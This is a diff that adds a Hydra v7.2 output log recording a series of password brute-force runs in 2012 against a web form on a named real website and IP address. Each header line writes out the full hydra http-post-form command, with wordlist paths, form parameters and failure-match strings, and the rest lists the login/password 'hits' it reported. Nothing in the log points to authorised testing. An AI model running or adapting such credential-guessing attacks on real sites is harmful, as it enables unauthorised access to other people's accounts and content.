@@ -1,0 +1,34 @@
+# Hydra v7.2 run at 2012-02-12 00:46:02 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -L /Users/andreygrabovenko/pass -w 60 -s 80 -t 1 -vV -P /Users/andreygrabovenko/pass www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^PASS^&submit=Готово:Пароль не верный[80][www-form] host: 217.65.7.38   login: 123   password: 123
+[80][www-form] host: 217.65.7.38   login: 222   password: 123
+[80][www-form] host: 217.65.7.38   login: 111   password: 123
+[80][www-form] host: 217.65.7.38   login: 321   password: 123
+[80][www-form] host: 217.65.7.38   login:    password: 123
+# Hydra v7.2 run at 2012-02-12 00:47:47 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -l pass -w 60 -s 80 -t 1 -vV -P /Users/andreygrabovenko/pass www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^PASS^&submit=Готово:Пароль не верный[80][www-form] host: 217.65.7.38   login: pass   password: 123
+# Hydra v7.2 run at 2012-02-12 00:52:07 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -L /Users/andreygrabovenko/pass -w 60 -s 80 -t 1 -vV -P /Users/andreygrabovenko/pass www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^PASS^&submit=Готово:Пароль не верный[80][www-form] host: 217.65.7.38   login: 123   password: 123
+[80][www-form] host: 217.65.7.38   login: 222   password: 123
+[80][www-form] host: 217.65.7.38   login: 111   password: 123
+[80][www-form] host: 217.65.7.38   login: 321   password: 123
+[80][www-form] host: 217.65.7.38   login:    password: 123
+# Hydra v7.2 run at 2012-02-12 00:53:44 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -L /Users/andreygrabovenko/pass -w 60 -s 80 -t 1 -vV -P /Users/andreygrabovenko/pass www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:Пароль не верный[80][www-form] host: 217.65.7.38   login: 123   password: 123
+[80][www-form] host: 217.65.7.38   login: 222   password: 123
+[80][www-form] host: 217.65.7.38   login: 111   password: 123
+[80][www-form] host: 217.65.7.38   login: 321   password: 123
+[80][www-form] host: 217.65.7.38   login:    password: 123
+# Hydra v7.2 run at 2012-02-12 00:57:47 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:Пароль не верный[80][www-form] host: 217.65.7.38   login: 123   password: 
+[80][www-form] host: 217.65.7.38   login: 222   password: 
+[80][www-form] host: 217.65.7.38   login: 111   password: 
+[80][www-form] host: 217.65.7.38   login: 321   password: 
+[80][www-form] host: 217.65.7.38   login:    password: 
+# Hydra v7.2 run at 2012-02-12 00:59:30 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:Пароль верный[80][www-form] host: 217.65.7.38   login: 123   password: 
+[80][www-form] host: 217.65.7.38   login: 222   password: 
+[80][www-form] host: 217.65.7.38   login: 111   password: 
+[80][www-form] host: 217.65.7.38   login: 321   password: 
+[80][www-form] host: 217.65.7.38   login:    password: 
+# Hydra v7.2 run at 2012-02-12 01:03:14 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:Пароль верный[80][www-form] host: 217.65.7.38   login: 123   password: 
+[80][www-form] host: 217.65.7.38   login: 222   password: 
+[80][www-form] host: 217.65.7.38   login: 111   password: 
+[80][www-form] host: 217.65.7.38   login: 321   password: 
+[80][www-form] host: 217.65.7.38   login:    password: 
+# Hydra v7.2 run at 2012-02-12 01:10:46 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:color=#FF0000[80][www-form] host: 217.65.7.38   login: 321   password: 
+# Hydra v7.2 run at 2012-02-12 01:17:36 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:color=#FF0000[80][www-form] host: 217.65.7.38   login: 321123   password: 
+# Hydra v7.2 run at 2012-02-12 01:22:48 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -f -w 32 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:color=#FF0000# Hydra v7.2 run at 2012-02-12 01:27:17 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:color=#FF0000# Hydra v7.2 run at 2012-02-12 01:28:13 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:color=#FF0000# Hydra v7.2 run at 2012-02-12 12:18:22 on www.maw.ru http-post-form (/usr/local/sbin/bin/hydra  -o /Users/andreygrabovenko/att.txt -w 60 -L /Users/andreygrabovenko/pass -e n -s 80 -t 1 -vV www.maw.ru http-post-form /index.php?a=80208&alb=528745:upasa=^USER^&submit=Готово:color=#FF0000
